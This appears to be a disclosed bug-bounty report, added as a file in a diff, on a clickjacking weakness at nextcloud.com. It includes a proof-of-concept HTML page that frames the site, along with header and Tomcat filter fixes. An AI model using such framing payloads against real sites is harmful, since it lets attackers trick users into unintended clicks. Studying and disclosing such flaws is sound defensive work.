@@ -1,0 +1,97 @@
+ReportLink:https://hackerone.com/reports/710996
+WeaknessName:UI Redressing (Clickjacking)
+Reporter:https://hackerone.com/try_4_hack
+ReportedTo:Nextcloud(nextcloud)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:11.11.2019 15:27:59
+
+Summary:
+
+<html>
+hi!
+Test domain : https://nextcloud.com
+Summary
+======
+https://nextcloud.com/ A clickjacking vulnerability was detected because the X-Frame-Options Header was not set.More
+
+Steps To Reproduce
+==
+1. Create a new HTML file
+
+2. Include the following payload
+```
+<html>
+<head>
+<title>Trusted web page</title>
+</head>
+<body>
+<div id="content">
+<h1>https://nextcloud.com</h1>
+<form action="https://nextcloud.com">
+<input type="submit" class="button" value="Click and go!">
+</form>
+</div>
+<iframe id="clickjacking" src="https://nextcloud.com" width="500" height="500" scrolling="no" frameborder="none">
+</iframe>
+</body>
+</html>
+```
+3. Open document in browser
+
+Impact
+===
+An attacker could trick the user into sending a malicious link, and then the user could click on the image to cause potential harm.
+
+Solution
+===
+The vulnerability can be fixed by adding "frame-ancestors 'self';" to the CSP (Content-Security-Policy) header.
+
+
+```
+X-Frame-Options : DENY 
+X-Frame-Options : SAMEORIGIN , ALLOW-FROM allows 
+X-Frame-Options : ALLOW FROM https:// allow website address
+```
+```
+<!-- X-Frame-Options header -->
+
+    <filter>
+
+        <filter-name>httpHeaderSecurity</filter-name>
+
+        <filter-class>org.apache.catalina.filters.HttpHeaderSecurityFilter</filter-class>
+
+        <init-param>
+
+            <param-name>antiClickJackingOption</param-name>
+
+            <param-value>SAMEORIGIN</param-value>
+
+        </init-param>
+
+    </filter>
+
+    <filter-mapping>
+
+        <filter-name>httpHeaderSecurity</filter-name>
+
+        <url-pattern>*.do</url-pattern>
+
+    </filter-mapping>
+```
+
+
+
+References
+==
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+https://www.owasp.org/index.php/Clickjacking
+https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md
+
+Thanks you
+
+## Impact
+
+An attacker could potentially include a payload like this, which could potentially affect the victim.
